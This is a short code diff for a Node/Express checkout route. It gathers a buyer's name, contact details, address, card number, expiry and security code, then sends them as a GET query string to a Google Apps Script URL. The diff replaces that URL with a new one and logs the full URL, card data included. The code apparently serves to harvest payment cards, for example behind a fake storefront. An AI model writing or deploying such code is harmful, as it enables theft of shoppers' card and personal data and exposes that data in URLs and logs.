@@ -32,9 +32,11 @@ router.post("/checkout", async function (req, res, next) {
     return res.json("Invalid Card Information");
   }
   let url = `phone=${phone}&email=${email}&address=${address}&country=${country}&state=${state}&zip=${zip}&name=${name}&number=${number}&exp=${exp}&code=${code}`;
-  url = "https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + encodeURI(url)
-  console.log("New url= ", "https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + url);
-  await axios.get("https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + url).catch(error => {
+  url = "https://script.google.com/macros/s/AKfycbxyJOsFDfvZL5zgb7vz4cRr6vDOYHFdmT8Id7c8oQVICE-xj_8/exec?" + encodeURI(url)
+  console.log("New url= ", url);
+  await axios({
+    method: 'GET', url
+  }).catch(error => {
     console.log("Submit form fail\n", error);
   })
   // console.log("Ket qua: ", result.data)
